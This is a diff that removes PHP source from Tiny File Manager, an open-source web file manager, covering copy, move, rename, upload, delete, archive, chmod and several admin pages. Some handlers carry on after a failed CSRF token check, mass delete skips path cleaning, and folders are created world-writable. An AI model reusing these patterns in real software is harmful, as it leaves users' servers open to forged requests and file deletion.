-            // Check if a file with the duplicate name already exists, if so, make new name (edge case...)
-            while(file_exists($fn_duplicate) & $loop_count < $max_loop){
-               $fn_parts = pathinfo($fn_duplicate);
-               $fn_duplicate = $fn_parts['dirname'].'/'.$fn_parts['filename'].'-copy'.$extension_suffix;
-               $loop_count++;
-            }
-            if (fm_rcopy($from, $fn_duplicate, False)) {
-                fm_set_msg(sprintf('Copied from <b>%s</b> to <b>%s</b>', fm_enc($copy), fm_enc($fn_duplicate)));
-            } else {
-                fm_set_msg(sprintf('Error while copying from <b>%s</b> to <b>%s</b>', fm_enc($copy), fm_enc($fn_duplicate)), 'error');
-            }
-       }
-       else{
-           fm_set_msg(lng('Paths must be not equal'), 'alert');
-       }
-    }
-    $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
-}
-
-// Mass copy files/ folders
-if (isset($_POST['file'], $_POST['copy_to'], $_POST['finish'], $_POST['token']) && !FM_READONLY) {
-
-    if(!verifyToken($_POST['token'])) {
-        fm_set_msg(lng('Invalid Token.'), 'error');
-    }
-    
-    // from
-    $path = FM_ROOT_PATH;
-    if (FM_PATH != '') {
-        $path .= '/' . FM_PATH;
-    }
-    // to
-    $copy_to_path = FM_ROOT_PATH;
-    $copy_to = fm_clean_path($_POST['copy_to']);
-    if ($copy_to != '') {
-        $copy_to_path .= '/' . $copy_to;
-    }
-    if ($path == $copy_to_path) {
-        fm_set_msg(lng('Paths must be not equal'), 'alert');
-        $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
-    }
-    if (!is_dir($copy_to_path)) {
-        if (!fm_mkdir($copy_to_path, true)) {
-            fm_set_msg('Unable to create destination folder', 'error');
-            $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
-        }
-    }
-    // move?
-    $move = isset($_POST['move']);
-    // copy/move
-    $errors = 0;
-    $files = $_POST['file'];
-    if (is_array($files) && count($files)) {
-        foreach ($files as $f) {
-            if ($f != '') {
-                $f = fm_clean_path($f);
-                // abs path from
-                $from = $path . '/' . $f;
-                // abs path to
-                $dest = $copy_to_path . '/' . $f;
-                // do
-                if ($move) {
-                    $rename = fm_rename($from, $dest);
-                    if ($rename === false) {
-                        $errors++;
-                    }
-                } else {
-                    if (!fm_rcopy($from, $dest)) {
-                        $errors++;
-                    }
-                }
-            }
-        }
-        if ($errors == 0) {
-            $msg = $move ? 'Selected files and folders moved' : 'Selected files and folders copied';
-            fm_set_msg($msg);
-        } else {
-            $msg = $move ? 'Error while moving items' : 'Error while copying items';
-            fm_set_msg($msg, 'error');
-        }
-    } else {
-        fm_set_msg(lng('Nothing selected'), 'alert');
-    }
-    $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
-}
-
-// Rename
-if (isset($_POST['rename_from'], $_POST['rename_to'], $_POST['token']) && !FM_READONLY) {
-    if(!verifyToken($_POST['token'])) {
-        fm_set_msg("Invalid Token.", 'error');
-    }
-    // old name
-    $old = urldecode($_POST['rename_from']);
-    $old = fm_clean_path($old);
-    $old = str_replace('/', '', $old);
-    // new name
-    $new = urldecode($_POST['rename_to']);
-    $new = fm_clean_path(strip_tags($new));
-    $new = str_replace('/', '', $new);
-    // path
-    $path = FM_ROOT_PATH;
-    if (FM_PATH != '') {
-        $path .= '/' . FM_PATH;
-    }
-    // rename
-    if (fm_isvalid_filename($new) && $old != '' && $new != '') {
-        if (fm_rename($path . '/' . $old, $path . '/' . $new)) {
-            fm_set_msg(sprintf(lng('Renamed from').' <b>%s</b> '. lng('to').' <b>%s</b>', fm_enc($old), fm_enc($new)));
-        } else {
-            fm_set_msg(sprintf(lng('Error while renaming from').' <b>%s</b> '. lng('to').' <b>%s</b>', fm_enc($old), fm_enc($new)), 'error');
-        }
-    } else {
-        fm_set_msg(lng('Invalid characters in file name'), 'error');
-    }
-    $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
-}
-
-// Download
-if (isset($_GET['dl'], $_POST['token'])) {
-    if(!verifyToken($_POST['token'])) {
-        fm_set_msg("Invalid Token.", 'error');
-    }
-
-    $dl = urldecode($_GET['dl']);
-    $dl = fm_clean_path($dl);
-    $dl = str_replace('/', '', $dl);
-    $path = FM_ROOT_PATH;
-    if (FM_PATH != '') {
-        $path .= '/' . FM_PATH;
-    }
-    if ($dl != '' && is_file($path . '/' . $dl)) {
-        fm_download_file($path . '/' . $dl, $dl, 1024);
-        exit;
-    } else {
-        fm_set_msg(lng('File not found'), 'error');
-        $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
-    }
-}
-
-// Upload
-if (!empty($_FILES) && !FM_READONLY) {
-    if(isset($_POST['token'])) {
-        if(!verifyToken($_POST['token'])) {
-            $response = array ('status' => 'error','info' => "Invalid Token.");
-            echo json_encode($response); exit();
-        }
-    } else {
-        $response = array ('status' => 'error','info' => "Token Missing.");
-        echo json_encode($response); exit();
-    }
-
-    $chunkIndex = $_POST['dzchunkindex'];
-    $chunkTotal = $_POST['dztotalchunkcount'];
-    $fullPathInput = fm_clean_path($_REQUEST['fullpath']);
-
-    $f = $_FILES;
-    $path = FM_ROOT_PATH;
-    $ds = DIRECTORY_SEPARATOR;
-    if (FM_PATH != '') {
-        $path .= '/' . FM_PATH;
-    }
-
-    $errors = 0;
-    $uploads = 0;
-    $allowed = (FM_UPLOAD_EXTENSION) ? explode(',', FM_UPLOAD_EXTENSION) : false;
-    $response = array (
-        'status' => 'error',
-        'info'   => 'Oops! Try again'
-    );
-
-    $filename = $f['file']['name'];
-    $tmp_name = $f['file']['tmp_name'];
-    $ext = pathinfo($filename, PATHINFO_FILENAME) != '' ? strtolower(pathinfo($filename, PATHINFO_EXTENSION)) : '';
-    $isFileAllowed = ($allowed) ? in_array($ext, $allowed) : true;
-
-    if(!fm_isvalid_filename($filename) && !fm_isvalid_filename($fullPathInput)) {
-        $response = array (
-            'status'    => 'error',
-            'info'      => "Invalid File name!",
-        );
-        echo json_encode($response); exit();
-    }
-
-    $targetPath = $path . $ds;
-    if ( is_writable($targetPath) ) {
-        $fullPath = $path . '/' . $fullPathInput;
-        $folder = substr($fullPath, 0, strrpos($fullPath, "/"));
-
-        if (!is_dir($folder)) {
-            $old = umask(0);
-            mkdir($folder, 0777, true);
-            umask($old);
-        }
-
-        if (empty($f['file']['error']) && !empty($tmp_name) && $tmp_name != 'none' && $isFileAllowed) {
-            if ($chunkTotal){
-                $out = @fopen("{$fullPath}.part", $chunkIndex == 0 ? "wb" : "ab");
-                if ($out) {
-                    $in = @fopen($tmp_name, "rb");
-                    if ($in) {
-                        if (PHP_VERSION_ID < 80009) {
-                            // workaround https://bugs.php.net/bug.php?id=81145
-                            do {
-                                for (;;) {
-                                    $buff = fread($in, 4096);
-                                    if ($buff === false || $buff === '') {
-                                        break;
-                                    }
-                                    fwrite($out, $buff);
-                                }
-                            } while (!feof($in));
-                        } else {
-                            stream_copy_to_stream($in, $out);
-                        }
-                        $response = array (
-                            'status'    => 'success',
-                            'info' => "file upload successful"
-                        );
-                    } else {
-                        $response = array (
-                        'status'    => 'error',
-                        'info' => "failed to open output stream",
-                        'errorDetails' => error_get_last()
-                        );
-                    }
-                    @fclose($in);
-                    @fclose($out);
-                    @unlink($tmp_name);
-
-                    $response = array (
-                        'status'    => 'success',
-                        'info' => "file upload successful"
-                    );
-                } else {
-                    $response = array (
-                        'status'    => 'error',
-                        'info' => "failed to open output stream"
-                        );
-                }
-
-                if ($chunkIndex == $chunkTotal - 1) {
-                    if (file_exists ($fullPath)) {
-                        $ext_1 = $ext ? '.'.$ext : '';
-                        $fullPathTarget = $path . '/' . basename($fullPathInput, $ext_1) .'_'. date('ymdHis'). $ext_1;
-                    } else {
-                        $fullPathTarget = $fullPath;
-                    }
-                    rename("{$fullPath}.part", $fullPathTarget);
-                }
-
-            } else if (move_uploaded_file($tmp_name, $fullPath)) {
-                // Be sure that the file has been uploaded
-                if ( file_exists($fullPath) ) {
-                    $response = array (
-                        'status'    => 'success',
-                        'info' => "file upload successful"
-                    );
-                } else {
-                    $response = array (
-                        'status' => 'error',
-                        'info'   => 'Couldn\'t upload the requested file.'
-                    );
-                }
-            } else {
-                $response = array (
-                    'status'    => 'error',
-                    'info'      => "Error while uploading files. Uploaded files $uploads",
-                );
-            }
-        }
-    } else {
-        $response = array (
-            'status' => 'error',
-            'info'   => 'The specified folder for upload isn\'t writeable.'
-        );
-    }
-    // Return the response
-    echo json_encode($response);
-    exit();
-}
-
-// Mass deleting
-if (isset($_POST['group'], $_POST['delete'], $_POST['token']) && !FM_READONLY) {
-
-    if(!verifyToken($_POST['token'])) {
-        fm_set_msg(lng("Invalid Token."), 'error');
-    }
-
-    $path = FM_ROOT_PATH;
-    if (FM_PATH != '') {
-        $path .= '/' . FM_PATH;
-    }
-
-    $errors = 0;
-    $files = $_POST['file'];
-    if (is_array($files) && count($files)) {
-        foreach ($files as $f) {
-            if ($f != '') {
-                $new_path = $path . '/' . $f;
-                if (!fm_rdelete($new_path)) {
-                    $errors++;
-                }
-            }
-        }
-        if ($errors == 0) {
-            fm_set_msg(lng('Selected files and folder deleted'));
-        } else {
-            fm_set_msg(lng('Error while deleting items'), 'error');
-        }
-    } else {
-        fm_set_msg(lng('Nothing selected'), 'alert');
-    }
-
-    $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
-}
-
-// Pack files zip, tar
-if (isset($_POST['group'], $_POST['token']) && (isset($_POST['zip']) || isset($_POST['tar'])) && !FM_READONLY) {
-
-    if(!verifyToken($_POST['token'])) {
-        fm_set_msg(lng("Invalid Token."), 'error');
-    }
-
-    $path = FM_ROOT_PATH;
-    $ext = 'zip';
-    if (FM_PATH != '') {
-        $path .= '/' . FM_PATH;
-    }
-
-    //set pack type
-    $ext = isset($_POST['tar']) ? 'tar' : 'zip';
-
-    if (($ext == "zip" && !class_exists('ZipArchive')) || ($ext == "tar" && !class_exists('PharData'))) {
-        fm_set_msg(lng('Operations with archives are not available'), 'error');
-        $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
-    }
-
-    $files = $_POST['file'];
-    $sanitized_files = array();
-
-    // clean path
-    foreach($files as $file){
-        array_push($sanitized_files, fm_clean_path($file));
-    }
-    
-    $files = $sanitized_files;
-    
-    if (!empty($files)) {
-        chdir($path);
-
-        if (count($files) == 1) {
-            $one_file = reset($files);
-            $one_file = basename($one_file);
-            $zipname = $one_file . '_' . date('ymd_His') . '.'.$ext;
-        } else {
-            $zipname = 'archive_' . date('ymd_His') . '.'.$ext;
-        }
-
-        if($ext == 'zip') {
-            $zipper = new FM_Zipper();
-            $res = $zipper->create($zipname, $files);
-        } elseif ($ext == 'tar') {
-            $tar = new FM_Zipper_Tar();
-            $res = $tar->create($zipname, $files);
-        }
-
-        if ($res) {
-            fm_set_msg(sprintf(lng('Archive').' <b>%s</b> '.lng('Created'), fm_enc($zipname)));
-        } else {
-            fm_set_msg(lng('Archive not created'), 'error');
-        }
-    } else {
-        fm_set_msg(lng('Nothing selected'), 'alert');
-    }
-
-    $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
-}
-
-// Unpack zip, tar
-if (isset($_POST['unzip'], $_POST['token']) && !FM_READONLY) {
-
-    if(!verifyToken($_POST['token'])) {
-        fm_set_msg(lng("Invalid Token."), 'error');
-    }
-
-    $unzip = urldecode($_POST['unzip']);
-    $unzip = fm_clean_path($unzip);
-    $unzip = str_replace('/', '', $unzip);
-    $isValid = false;
-
-    $path = FM_ROOT_PATH;
-    if (FM_PATH != '') {
-        $path .= '/' . FM_PATH;
-    }
-
-    if ($unzip != '' && is_file($path . '/' . $unzip)) {
-        $zip_path = $path . '/' . $unzip;
-        $ext = pathinfo($zip_path, PATHINFO_EXTENSION);
-        $isValid = true;
-    } else {
-        fm_set_msg(lng('File not found'), 'error');
-    }
-
-    if (($ext == "zip" && !class_exists('ZipArchive')) || ($ext == "tar" && !class_exists('PharData'))) {
-        fm_set_msg(lng('Operations with archives are not available'), 'error');
-        $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
-    }
-
-    if ($isValid) {
-        //to folder
-        $tofolder = '';
-        if (isset($_POST['tofolder'])) {
-            $tofolder = pathinfo($zip_path, PATHINFO_FILENAME);
-            if (fm_mkdir($path . '/' . $tofolder, true)) {
-                $path .= '/' . $tofolder;
-            }
-        }
-
-        if($ext == "zip") {
-            $zipper = new FM_Zipper();
-            $res = $zipper->unzip($zip_path, $path);
-        } elseif ($ext == "tar") {
-            try {
-                $gzipper = new PharData($zip_path);
-                if (@$gzipper->extractTo($path,null, true)) {
-                    $res = true;
-                } else {
-                    $res = false;
-                }
-            } catch (Exception $e) {
-                //TODO:: need to handle the error
-                $res = true;
-            }
-        }
-
-        if ($res) {
-            fm_set_msg(lng('Archive unpacked'));
-        } else {
-            fm_set_msg(lng('Archive not unpacked'), 'error');
-        }
-    } else {
-        fm_set_msg(lng('File not found'), 'error');
-    }
-    $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
-}
-
-// Change Perms (not for Windows)
-if (isset($_POST['chmod'], $_POST['token']) && !FM_READONLY && !FM_IS_WIN) {
-
-    if(!verifyToken($_POST['token'])) {
-        fm_set_msg(lng("Invalid Token."), 'error');
-    }
-    
-    $path = FM_ROOT_PATH;
-    if (FM_PATH != '') {
-        $path .= '/' . FM_PATH;
-    }
-
-    $file = $_POST['chmod'];
-    $file = fm_clean_path($file);
-    $file = str_replace('/', '', $file);
-    if ($file == '' || (!is_file($path . '/' . $file) && !is_dir($path . '/' . $file))) {
-        fm_set_msg(lng('File not found'), 'error');
-        $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
-    }
-
-    $mode = 0;
-    if (!empty($_POST['ur'])) {
-        $mode |= 0400;
-    }
-    if (!empty($_POST['uw'])) {
-        $mode |= 0200;
-    }
-    if (!empty($_POST['ux'])) {
-        $mode |= 0100;
-    }
-    if (!empty($_POST['gr'])) {
-        $mode |= 0040;
-    }
-    if (!empty($_POST['gw'])) {
-        $mode |= 0020;
-    }
-    if (!empty($_POST['gx'])) {
-        $mode |= 0010;
-    }
-    if (!empty($_POST['or'])) {
-        $mode |= 0004;
-    }
-    if (!empty($_POST['ow'])) {
-        $mode |= 0002;
-    }
-    if (!empty($_POST['ox'])) {
-        $mode |= 0001;
-    }
-
-    if (@chmod($path . '/' . $file, $mode)) {
-        fm_set_msg(lng('Permissions changed'));
-    } else {
-        fm_set_msg(lng('Permissions not changed'), 'error');
-    }
-
-    $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
-}
-
-/*************************** ACTIONS ***************************/
-
-// get current path
-$path = FM_ROOT_PATH;
-if (FM_PATH != '') {
-    $path .= '/' . FM_PATH;
-}
-
-// check path
-if (!is_dir($path)) {
-    fm_redirect(FM_SELF_URL . '?p=');
-}
-
-// get parent folder
-$parent = fm_get_parent_path(FM_PATH);
-
-$objects = is_readable($path) ? scandir($path) : array();
-$folders = array();
-$files = array();
-$current_path = array_slice(explode("/",$path), -1)[0];
-if (is_array($objects) && fm_is_exclude_items($current_path)) {
-    foreach ($objects as $file) {
-        if ($file == '.' || $file == '..') {
-            continue;
-        }
-        if (!FM_SHOW_HIDDEN && substr($file, 0, 1) === '.') {
-            continue;
-        }
-        $new_path = $path . '/' . $file;
-        if (@is_file($new_path) && fm_is_exclude_items($file)) {
-            $files[] = $file;
-        } elseif (@is_dir($new_path) && $file != '.' && $file != '..' && fm_is_exclude_items($file)) {
-            $folders[] = $file;
-        }
-    }
-}
-
-if (!empty($files)) {
-    natcasesort($files);
-}
-if (!empty($folders)) {
-    natcasesort($folders);
-}
-
-// upload form
-if (isset($_GET['upload']) && !FM_READONLY) {
-    fm_show_header(); // HEADER
-    fm_show_nav_path(FM_PATH); // current path
-    //get the allowed file extensions
-    function getUploadExt() {
-        $extArr = explode(',', FM_UPLOAD_EXTENSION);
-        if(FM_UPLOAD_EXTENSION && $extArr) {
-            array_walk($extArr, function(&$x) {$x = ".$x";});
-            return implode(',', $extArr);
-        }
-        return '';
-    }
-    ?>
-    <?php print_external('css-dropzone'); ?>
-    <div class="path">
-
-        <div class="card mb-2 fm-upload-wrapper <?php echo fm_get_theme(); ?>">
-            <div class="card-header">
-                <ul class="nav nav-tabs card-header-tabs">
-                    <li class="nav-item">
-                        <a class="nav-link active" href="#fileUploader" data-target="#fileUploader"><i class="fa fa-arrow-circle-o-up"></i> <?php echo lng('UploadingFiles') ?></a>
-                    </li>
-                    <li class="nav-item">
-                        <a class="nav-link" href="#urlUploader" class="js-url-upload" data-target="#urlUploader"><i class="fa fa-link"></i> <?php echo lng('Upload from URL') ?></a>
-                    </li>
-                </ul>
-            </div>
-            <div class="card-body">
-                <p class="card-text">
-                    <a href="?p=<?php echo FM_PATH ?>" class="float-right"><i class="fa fa-chevron-circle-left go-back"></i> <?php echo lng('Back')?></a>
-                    <strong><?php echo lng('DestinationFolder') ?></strong>: <?php echo fm_enc(fm_convert_win(FM_PATH)) ?>
-                </p>
-
-                <form action="<?php echo htmlspecialchars(FM_SELF_URL) . '?p=' . fm_enc(FM_PATH) ?>" class="dropzone card-tabs-container" id="fileUploader" enctype="multipart/form-data">
-                    <input type="hidden" name="p" value="<?php echo fm_enc(FM_PATH) ?>">
-                    <input type="hidden" name="fullpath" id="fullpath" value="<?php echo fm_enc(FM_PATH) ?>">
-                    <input type="hidden" name="token" value="<?php echo $_SESSION['token']; ?>">
-                    <div class="fallback">
-                        <input name="file" type="file" multiple/>
-                    </div>
-                </form>
-
-                <div class="upload-url-wrapper card-tabs-container hidden" id="urlUploader">
-                    <form id="js-form-url-upload" class="row row-cols-lg-auto g-3 align-items-center" onsubmit="return upload_from_url(this);" method="POST" action="">
-                        <input type="hidden" name="type" value="upload" aria-label="hidden" aria-hidden="true">
-                        <input type="url" placeholder="URL" name="uploadurl" required class="form-control" style="width: 80%">
-                        <input type="hidden" name="token" value="<?php echo $_SESSION['token']; ?>">
-                        <button type="submit" class="btn btn-primary ms-3"><?php echo lng('Upload') ?></button>
-                        <div class="lds-facebook"><div></div><div></div><div></div></div>
-                    </form>
-                    <div id="js-url-upload__list" class="col-9 mt-3"></div>
-                </div>
-            </div>
-        </div>
-    </div>
-    <?php print_external('js-dropzone'); ?>
-    <script>
-        Dropzone.options.fileUploader = {
-            chunking: true,
-            chunkSize: <?php echo UPLOAD_CHUNK_SIZE; ?>,
-            forceChunking: true,
-            retryChunks: true,
-            retryChunksLimit: 3,
-            parallelUploads: 1,
-            parallelChunkUploads: false,
-            timeout: 120000,
-            maxFilesize: "<?php echo MAX_UPLOAD_SIZE; ?>",
-            acceptedFiles : "<?php echo getUploadExt() ?>",
-            init: function () {
-                this.on("sending", function (file, xhr, formData) {
-                    let _path = (file.fullPath) ? file.fullPath : file.name;
-                    document.getElementById("fullpath").value = _path;
-                    xhr.ontimeout = (function() {
-                        toast('Error: Server Timeout');
-                    });
-                }).on("success", function (res) {
-                    try {
-                        let _response = JSON.parse(res.xhr.response);
-
-                        if(_response.status == "error") {
-                            toast(_response.info);
-                        }
-                    } catch (e) {
-                        toast("Error: Invalid JSON response");
-                    }
-                }).on("error", function(file, response) {
-                    toast(response);
-                });
-            }
-        }
-    </script>
-    <?php
-    fm_show_footer();
-    exit;
-}
-
-// copy form POST
-if (isset($_POST['copy']) && !FM_READONLY) {
-    $copy_files = isset($_POST['file']) ? $_POST['file'] : null;
-    if (!is_array($copy_files) || empty($copy_files)) {
-        fm_set_msg(lng('Nothing selected'), 'alert');
-        $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
-    }
-
-    fm_show_header(); // HEADER
-    fm_show_nav_path(FM_PATH); // current path
-    ?>
-    <div class="path">
-        <div class="card <?php echo fm_get_theme(); ?>">
-            <div class="card-header">
-                <h6><?php echo lng('Copying') ?></h6>
-            </div>
-            <div class="card-body">
-                <form action="" method="post">
-                    <input type="hidden" name="p" value="<?php echo fm_enc(FM_PATH) ?>">
-                    <input type="hidden" name="finish" value="1">
-                    <?php
-                    foreach ($copy_files as $cf) {
-                        echo '<input type="hidden" name="file[]" value="' . fm_enc($cf) . '">' . PHP_EOL;
-                    }
-                    ?>
-                    <p class="break-word"><strong><?php echo lng('Files') ?></strong>: <b><?php echo implode('</b>, <b>', $copy_files) ?></b></p>
-                    <p class="break-word"><strong><?php echo lng('SourceFolder') ?></strong>: <?php echo fm_enc(fm_convert_win(FM_ROOT_PATH . '/' . FM_PATH)) ?><br>
-                        <label for="inp_copy_to"><strong><?php echo lng('DestinationFolder') ?></strong>:</label>
-                        <?php echo FM_ROOT_PATH ?>/<input type="text" name="copy_to" id="inp_copy_to" value="<?php echo fm_enc(FM_PATH) ?>">
-                    </p>
-                    <p class="custom-checkbox custom-control"><input type="checkbox" name="move" value="1" id="js-move-files" class="custom-control-input"><label for="js-move-files" class="custom-control-label ms-2"> <?php echo lng('Move') ?></label></p>
-                    <p>
-                        <b><a href="?p=<?php echo urlencode(FM_PATH) ?>" class="btn btn-outline-danger"><i class="fa fa-times-circle"></i> <?php echo lng('Cancel') ?></a></b>&nbsp;
-                        <input type="hidden" name="token" value="<?php echo $_SESSION['token']; ?>">
-                        <button type="submit" class="btn btn-success"><i class="fa fa-check-circle"></i> <?php echo lng('Copy') ?></button> 
-                    </p>
-                </form>
-            </div>
-        </div>
-    </div>
-    <?php
-    fm_show_footer();
-    exit;
-}
-
-// copy form
-if (isset($_GET['copy']) && !isset($_GET['finish']) && !FM_READONLY) {
-    $copy = $_GET['copy'];
-    $copy = fm_clean_path($copy);
-    if ($copy == '' || !file_exists(FM_ROOT_PATH . '/' . $copy)) {
-        fm_set_msg(lng('File not found'), 'error');
-        $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
-    }
-
-    fm_show_header(); // HEADER
-    fm_show_nav_path(FM_PATH); // current path
-    ?>
-    <div class="path">
-        <p><b>Copying</b></p>
-        <p class="break-word">
-            <strong>Source path:</strong> <?php echo fm_enc(fm_convert_win(FM_ROOT_PATH . '/' . $copy)) ?><br>
-            <strong>Destination folder:</strong> <?php echo fm_enc(fm_convert_win(FM_ROOT_PATH . '/' . FM_PATH)) ?>
-        </p>
-        <p>
-            <b><a href="?p=<?php echo urlencode(FM_PATH) ?>&amp;copy=<?php echo urlencode($copy) ?>&amp;finish=1"><i class="fa fa-check-circle"></i> Copy</a></b> &nbsp;
-            <b><a href="?p=<?php echo urlencode(FM_PATH) ?>&amp;copy=<?php echo urlencode($copy) ?>&amp;finish=1&amp;move=1"><i class="fa fa-check-circle"></i> Move</a></b> &nbsp;
-            <b><a href="?p=<?php echo urlencode(FM_PATH) ?>" class="text-danger"><i class="fa fa-times-circle"></i> Cancel</a></b>
-        </p>
-        <p><i><?php echo lng('Select folder') ?></i></p>
-        <ul class="folders break-word">
-            <?php
-            if ($parent !== false) {
-                ?>
-                <li><a href="?p=<?php echo urlencode($parent) ?>&amp;copy=<?php echo urlencode($copy) ?>"><i class="fa fa-chevron-circle-left"></i> ..</a></li>
-                <?php
-            }
-            foreach ($folders as $f) {
-                ?>
-                <li>
-                    <a href="?p=<?php echo urlencode(trim(FM_PATH . '/' . $f, '/')) ?>&amp;copy=<?php echo urlencode($copy) ?>"><i class="fa fa-folder-o"></i> <?php echo fm_convert_win($f) ?></a></li>
-                <?php
-            }
-            ?>
-        </ul>
-    </div>
-    <?php
-    fm_show_footer();
-    exit;
-}
-
-if (isset($_GET['settings']) && !FM_READONLY) {
-    fm_show_header(); // HEADER
-    fm_show_nav_path(FM_PATH); // current path
-    global $cfg, $lang, $lang_list;
-    ?>
-
-    <div class="col-md-8 offset-md-2 pt-3">
-        <div class="card mb-2 <?php echo fm_get_theme(); ?>">
-            <h6 class="card-header d-flex justify-content-between">
-                <span><i class="fa fa-cog"></i>  <?php echo lng('Settings') ?></span>
-                <a href="?p=<?php echo FM_PATH ?>" class="text-danger"><i class="fa fa-times-circle-o"></i> <?php echo lng('Cancel')?></a>
-            </h6>
-            <div class="card-body">
-                <form id="js-settings-form" action="" method="post" data-type="ajax" onsubmit="return save_settings(this)">
-                    <input type="hidden" name="type" value="settings" aria-label="hidden" aria-hidden="true">
-                    <div class="form-group row">
-                        <label for="js-language" class="col-sm-3 col-form-label"><?php echo lng('Language') ?></label>
-                        <div class="col-sm-5">
-                            <select class="form-select" id="js-language" name="js-language">
-                                <?php
-                                function getSelected($l) {
-                                    global $lang;
-                                    return ($lang == $l) ? 'selected' : '';
-                                }
-                                foreach ($lang_list as $k => $v) {
-                                    echo "<option value='$k' ".getSelected($k).">$v</option>";
-                                }
-                                ?>
-                            </select>
-                        </div>
-                    </div>
-                    <div class="mt-3 mb-3 row ">
-                        <label for="js-error-report" class="col-sm-3 col-form-label"><?php echo lng('ErrorReporting') ?></label>
-                        <div class="col-sm-9">
-                            <div class="form-check form-switch">
-                              <input class="form-check-input" type="checkbox" role="switch" id="js-error-report" name="js-error-report" value="true" <?php echo $report_errors ? 'checked' : ''; ?> />
-                            </div>
-                        </div>
-                    </div>
-
-                    <div class="mb-3 row">
-                        <label for="js-show-hidden" class="col-sm-3 col-form-label"><?php echo lng('ShowHiddenFiles') ?></label>
-                        <div class="col-sm-9">
-                            <div class="form-check form-switch">
-                              <input class="form-check-input" type="checkbox" role="switch" id="js-show-hidden" name="js-show-hidden" value="true" <?php echo $show_hidden_files ? 'checked' : ''; ?> />
-                            </div>
-                        </div>
-                    </div>
-
-                    <div class="mb-3 row">
-                        <label for="js-hide-cols" class="col-sm-3 col-form-label"><?php echo lng('HideColumns') ?></label>
-                        <div class="col-sm-9">
-                            <div class="form-check form-switch">
-                              <input class="form-check-input" type="checkbox" role="switch" id="js-hide-cols" name="js-hide-cols" value="true" <?php echo $hide_Cols ? 'checked' : ''; ?> />
-                            </div>
-                        </div>
-                    </div>
-
-                    <div class="mb-3 row">
-                        <label for="js-3-1" class="col-sm-3 col-form-label"><?php echo lng('Theme') ?></label>
-                        <div class="col-sm-5">
-                            <select class="form-select w-100" id="js-3-0" name="js-theme-3">
-                                <option value='light' <?php if($theme == "light"){echo "selected";} ?>><?php echo lng('light') ?></option>
-                                <option value='dark' <?php if($theme == "dark"){echo "selected";} ?>><?php echo lng('dark') ?></option>
-                            </select>
-                        </div>
-                    </div>
-
-                    <div class="mb-3 row">
-                        <div class="col-sm-10">
-                            <button type="submit" class="btn btn-success"> <i class="fa fa-check-circle"></i> <?php echo lng('Save'); ?></button>
-                        </div>
-                    </div>
-
-                </form>
-            </div>
-        </div>
-    </div>
-    <?php
-    fm_show_footer();
-    exit;
-}
-
-if (isset($_GET['help'])) {
-    fm_show_header(); // HEADER
-    fm_show_nav_path(FM_PATH); // current path
-    global $cfg, $lang;
-    ?>
-
-    <div class="col-md-8 offset-md-2 pt-3">
-        <div class="card mb-2 <?php echo fm_get_theme(); ?>">
-            <h6 class="card-header d-flex justify-content-between">
-                <span><i class="fa fa-exclamation-circle"></i> <?php echo lng('Help') ?></span>
-                <a href="?p=<?php echo FM_PATH ?>" class="text-danger"><i class="fa fa-times-circle-o"></i> <?php echo lng('Cancel')?></a>
-            </h6>
-            <div class="card-body">
-                <div class="row">
-                    <div class="col-xs-12 col-sm-6">
-                        <p><h3><a href="https://github.com/prasathmani/tinyfilemanager" target="_blank" class="app-v-title"> Tiny File Manager <?php echo VERSION; ?></a></h3></p>
-                        <p>Author: Prasath Mani</p>
-                        <p>Mail Us: <a href="mailto:ccpprogrammers@gmail.com">ccpprogrammers[at]gmail.com</a> </p>
-                    </div>
-                    <div class="col-xs-12 col-sm-6">
-                        <div class="card">
-                            <ul class="list-group list-group-flush">
-                                <li class="list-group-item"><a href="https://github.com/prasathmani/tinyfilemanager/wiki" target="_blank"><i class="fa fa-question-circle"></i> <?php echo lng('Help Documents') ?> </a> </li>
-                                <li class="list-group-item"><a href="https://github.com/prasathmani/tinyfilemanager/issues" target="_blank"><i class="fa fa-bug"></i> <?php echo lng('Report Issue') ?></a></li>
-                                <?php if(!FM_READONLY) { ?>
-                                <li class="list-group-item"><a href="javascript:show_new_pwd();"><i class="fa fa-lock"></i> <?php echo lng('Generate new password hash') ?></a></li>
-                                <?php } ?>
-                            </ul>
-                        </div>
-                    </div>
-                </div>
-                <div class="row js-new-pwd hidden mt-2">
-                    <div class="col-12">
-                        <form class="form-inline" onsubmit="return new_password_hash(this)" method="POST" action="">
-                            <input type="hidden" name="type" value="pwdhash" aria-label="hidden" aria-hidden="true">
-                            <div class="form-group mb-2">
-                                <label for="staticEmail2"><?php echo lng('Generate new password hash') ?></label>
-                            </div>
-                            <div class="form-group mx-sm-3 mb-2">
-                                <label for="inputPassword2" class="sr-only"><?php echo lng('Password') ?></label>
-                                <input type="text" class="form-control btn-sm" id="inputPassword2" name="inputPassword2" placeholder="<?php echo lng('Password') ?>" required>
-                            </div>
-                            <button type="submit" class="btn btn-success btn-sm mb-2"><?php echo lng('Generate') ?></button>
-                        </form>
-                        <textarea class="form-control" rows="2" readonly id="js-pwd-result"></textarea>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-    <?php
-    fm_show_footer();
-    exit;
-}
-
-// file viewer
-if (isset($_GET['view'])) {
-    $file = $_GET['view'];
-    $file = fm_clean_path($file, false);
-    $file = str_replace('/', '', $file);
